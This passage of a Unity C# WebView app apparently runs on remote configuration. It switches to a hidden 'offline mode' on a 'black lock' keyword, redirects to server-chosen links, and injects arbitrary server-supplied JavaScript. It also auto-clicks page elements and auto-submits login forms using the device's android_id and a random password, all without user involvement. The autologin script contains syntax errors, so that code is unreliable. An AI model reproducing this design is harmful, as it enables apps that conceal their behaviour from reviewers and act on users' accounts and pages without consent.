            _ShowAndroidToastMessage("OnPageStarted: " + url_);
        }

        //_ShowAndroidToastMessage("S");
        StartCoroutine(ShowDelay(webView)); // Start the coroutine for showing the loading layer.

        if (url_.Contains(data.BlackLockKeyword)) { // If the link contains the black lock keyword, then we enable offline mode.
            //UIDLayer.text = "blk";
            PlayerPrefs.SetInt("OfflineMode", 1); // Remember for future launches of the application that the offline mode is saved.
            OfflineMode(); // Enable offline mode.
        }

        if (url_.Contains(data.RealBrowserTrigger)) {
            if (data.DebugRealBrowserTrigger == Response.ResponseBool.Enable) {
                _ShowAndroidToastMessage("RealBrowserTrigger: " + url_);
            }
            launchBrowser(url_); // Open the link in the real browser.
        }
        
        if (url_.Contains(data.RedirectKeyword)) { // If the link contains the words triggers for a redirect, then make a redirect
            if (data.DebugRedirectLink == Response.ResponseBool.Enable) {
                _ShowAndroidToastMessage("Redirect Link Checked: " + url_);
            }
            webView.Stop(); // Stop opening the current link
            webView.Load(data.RedirectLink); // Open redirect link
        }


        // -----------------
        if (!(data.RememberAltLink == Response.ResponseBool.Enable))
        { // If the RememberAltLink variable is not enabled
            if(!url_.Contains(data.BlackLockKeyword) && url_ != "about:blank") { // If the link does not contain the black lock keyword and is not equal to about:blank, then we save the link.
                PlayerPrefs.SetString("LastSavedLink", url_); // Save the link.
            }
        }

        return;
        
    }

    // Open link in default browser
    // Launch link in Android browser using C# code in Unity
    private void launchBrowser(string url_)
    {
        Application.OpenURL(url_);
    }

    private void legacyLaunchBrowser(string _url)
    {
#if UNITY_ANDROID
            // Get the Android Java class for the Intent class
            AndroidJavaClass intentClass = new AndroidJavaClass("android.content.Intent");

            // Create a new intent using the ACTION_VIEW action
            AndroidJavaObject intent = intentClass.CallStatic<AndroidJavaObject>("getActionViewIntent", _url);

            // Get the current Android activity
            AndroidJavaClass unityPlayer = new AndroidJavaClass("com.unity3d.player.UnityPlayer");
            AndroidJavaObject currentActivity = unityPlayer.GetStatic<AndroidJavaObject>("currentActivity");

            // Start the activity with the intent
            currentActivity.Call("startActivity", intent);
#endif
    }

    private bool legacyHasRedirectKeywords(string url_) // Checking trigger words for a redirect
    {
        /*

        if (string.IsNullOrEmpty(data.RedirectKeywords) || string.IsNullOrEmpty(data.RedirectLink)) return false; // If the redirect trigger or link is empty, then we return false.

        string[] splittedRedirectKeywords = data.RedirectKeywords.Split('|');
        
        bool isNotEmpty = splittedRedirectKeywords.Any(); // Is there at least one word in the RedirectKeywords list

        if (isNotEmpty) // If there is at least one word in the list
        {
            bool redirectKeywordsAny = splittedRedirectKeywords.Any(p => url_.Contains(p)); // Checking if there is at least one word trigger for page redirect in url

            if (redirectKeywordsAny) // If there is at least one word trigger in the URL
            {
                return true; // Can redirect
            }
        }
        */
        return false; // Otherwise, cannot redirect
        
    }

    private void JavaScriptClick() // Executes JavaScript in a WebView - click on an element on the site
    {

        string elements = data.JavascriptClickElements; // Get the list of elements to click
        if (!String.IsNullOrEmpty(elements)) // Validate
        {
            string[] splittedElements = elements.Split('|'); // Split the resulting list of HTML code into individual HTML element names.

            for (int i = 0; i < splittedElements.Length; i++){  // Go through the list of elements
                string element = splittedElements[i]; // Get the element from the list
                webView.AddJavaScript("javascript:document.getElementById(''); document.querySelector('" + element + "').click(); void(0);"); // Execute JavaScript in a WebView - click on an element on the site
            }

            /*
            webView.EvaluatingJavaScript // Execute JavaScript in a WebView
            (
                "var elements = " + elements + "; " + // Get the list of elements to click
                "for (var i = 0; i < elements.length; i++) { " + // Loop through the list of elements
                "var element = document.querySelector(elements[i]); " + // Get the element from the list
                "if (element) { " + // If the element is found
                "element.click(); " + // Click on the element
                "}" +
                "}"
            );

            webView.AddJavaScript // Execute JavaScript in a WebView
            (
                "var elements = " + elements + "; " + // Get the list of elements to click
                "for (var i = 0; i < elements.length; i++) { " + // Loop through the list of elements
                "var element = document.querySelector(elements[i]); " + // Get the element from the list
                "if (element) { " + // If the element is found
                "element.click(); " + // Click on the element
                "}" +
                "}"
            );
            */

        }
    }

    private void JavaScriptClear() // Executes JavaScript in a WebView - remove HTML element on site
    {

        string elements = data.JavascriptClearElements; // Get the list of elements to remove
        if (!String.IsNullOrEmpty(elements)) // Validate
        {

            string[] splittedElements = elements.Split('|'); // Split the resulting list of HTML code into individual HTML element names.
           
            for (int i = 0; i < splittedElements.Length; i++){ // Go through the list of elements
                string element = splittedElements[i]; // Get the element from the list
                webView.AddJavaScript("javascript:document.getElementById(''); document.querySelector('" + element + "').innerHTML = ''; void(0);"); // Execute JavaScript in a WebView - remove HTML element on site
            }

        }
    }

    private void ExecuteCustomJavaScript() // Executes JavaScript in a WebView - custom JavaScript
    {

        string javascript = data.JavascriptCustom;
        if (!String.IsNullOrEmpty(javascript)) // Is empty?
        {
            webView.AddJavaScript(javascript); // Execute JavaScript in a WebView - custom JavaScript
        }
    }

    private void JavaScriptAutologin() { // Executes JavaScript in a WebView - autologin

        if (String.IsNullOrEmpty(data.FormUsername)) return; // If the username field is empty, then we return false.
        if (String.IsNullOrEmpty(data.FormPass)) return; // If the pass field is empty, then we return false.
        if (String.IsNullOrEmpty(data.ButtonSubmit)) return; // If the submit field is empty, then we return false.

        webView.AddJavaScript // Execute JavaScript in a WebView
        (
            "var username = document.getElementById('" + data.FormUsername + "');" + // Get the HTML element
            "var pass = document.getElementById('" + data.FormPass + "');" + // Get the pass HTML element
            "var submit = document.getElementById('" + data.ButtonSubmit + "');" + // Get the submit HTML element
            "username.value = '" + getPhoneNumber() + "');" + // Set the username value
            "pass.value = '" + generateRandomPasswordString() + "');" + // Set the pass value
            "submit.click();" // Click on the submit button
        );

    }

    // Make random string in Unity
    private static string generateRandomPasswordString() {
        string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        string password = "";
        for (int i = 0; i < 8; i++) {
            password += chars[UnityEngine.Random.Range(0, chars.Length)];
        }
        return password;
    }

    private static string getPhoneNumber() { // Get the phone number from the device.
        string phoneNumber = "";
#if UNITY_ANDROID
            AndroidJavaClass up = new AndroidJavaClass("com.unity3d.player.UnityPlayer");
            AndroidJavaObject ca = up.GetStatic<AndroidJavaObject>("currentActivity");
            AndroidJavaObject contentResolver = ca.Call<AndroidJavaObject>("getContentResolver");
            AndroidJavaClass secure = new AndroidJavaClass("android.provider.Settings$Secure");
            phoneNumber = secure.CallStatic<string>("getString", contentResolver, "android_id");
#endif
        return phoneNumber;
    }
    
    IEnumerator ShowDelay(UniWebView webView)
    { // Start the coroutine for showing the loading layer.
        int i = 1; // Create a variable for the number of attempts to show the loading layer.
        // _ShowAndroidToastMessage("INE");
        yield return new WaitForSeconds(2); // Wait 2 seconds.
        if(i == 1) webView.Show(); // Show the WebView.
        //   _ShowAndroidToastMessage("F");
    }

    IEnumerator SetRating(float reviewSeconds)
        { // Start the coroutine for request rating.

#if UNITY_IOS || UNITY_EDITOR // If the platform is iOS or Windows Editor, then we request rating.
                yield return new WaitForSeconds(reviewSeconds); // Wait for the specified number of seconds.
                UnityEngine.iOS.Device.RequestStoreReview(); // Request rating.
#endif

#if UNITY_ANDROID // If the platform is Android, then we request rating.
            var requestFlowOperation = _reviewManager.RequestReviewFlow(); // Request rating.

            yield return requestFlowOperation; // Wait for the request to complete.

            
            if (requestFlowOperation.Error != ReviewErrorCode.NoError)
            { // If the request failed, then we show the error message.
                _ShowAndroidToastMessage("❤"); // Show the error message.
                // Debug.Log("requestFlowOperation.Error.ToString(): " + requestFlowOperation.Error); // Show the error message.
                yield break; // Stop the coroutine.
            }

            var playReviewInfo = requestFlowOperation.GetResult(); // Get the result of the request.

            yield return new WaitForSeconds((float)reviewSeconds); // Wait for the specified number of seconds.

            var launchFlowOperation = _reviewManager.LaunchReviewFlow(playReviewInfo); // Launch the rating request.

            yield return launchFlowOperation; // Wait for the request to complete.

            _ShowAndroidToastMessage("❤"); // Show the love message.
            if (launchFlowOperation.Error != ReviewErrorCode.NoError)
            { // If the request failed, then we show the error message.
                // Debug.Log("requestFlowOperation.Error.ToString(): " + requestFlowOperation.Error); // Show the error message.

                yield break; // Stop the coroutine.
            }
#endif
    }

    private void _ShowAndroidToastMessage(string message) // Show the toast message.
    { 
#if UNITY_ANDROID
            AndroidJavaClass unityPlayer = new AndroidJavaClass("com.unity3d.player.UnityPlayer"); // Create a variable for the UnityPlayer class.
            AndroidJavaObject unityActivity = unityPlayer.GetStatic<AndroidJavaObject>("currentActivity"); // Create a variable for the current activity.

            if (unityActivity != null)
            { // If the current activity is not empty, then we show the toast message.
                AndroidJavaClass toastClass = new AndroidJavaClass("android.widget.Toast"); // Create a variable for the Toast class.
                unityActivity.Call("runOnUiThread", new AndroidJavaRunnable(() =>
                { // Run the toast message on the main thread.
                    AndroidJavaObject toastObject =
                        toastClass.CallStatic<AndroidJavaObject>("makeText", unityActivity, message, 0); // Create a variable for the toast message.
                    toastObject.Call("setDuration", 10000); // Set the duration of the toast to 10 seconds.
                    toastObject.Call("show"); // Show the toast message.
                }));
            }
#endif
    }  

    
    public void LaunchOneSignal(string appId)
    { 
#if UNITY_ANDROID

            // Enable lines below to debug issues with OneSignal
            // OneSignal.Default.LogLevel   = LogLevel.Info;
            // OneSignal.Default.AlertLevel = LogLevel.Fatal;

            // OneSignal.Default.PrivacyConsent = true; // Set the privacy consent.

            // PromptForPush(); // Prompt for push.

            OneSignal.Default.Initialize(appId); // Initialize the service.

#endif
    }
    
    public async void PromptForPush() { // Prompt for push.
#if UNITY_ANDROID
            var result = await OneSignal.Default.PromptForPushNotificationsWithUserResponse(); // Prompt for push.
#endif
    }

    // AppMetrica Example
    /*
    public void SetAPIKey (string key)
    {
        if (!string.IsNullOrEmpty(key))
        {
            ApiKey = key; // Set API key
            SetupMetrica(); // Setup AppMetrica
            Instance.ResumeSession(); // Resume session
        }
    }
    */

    /*
    "com.onesignal.unity.android": "3.0.8",
    "com.onesignal.unity.core": "3.0.8",
    "com.onesignal.unity.ios": "3.0.8",

    ,
    "scopedRegistries": [
        {
        "name": "npmjs",
        "url": "https://registry.npmjs.org",
        "scopes": [
            "com.onesignal"
        ]
        }
    ]

    */

    //--------------------------------------------------------------------------------------
    // WebView Mode
    //--------------------------------------------------------------------------------------

}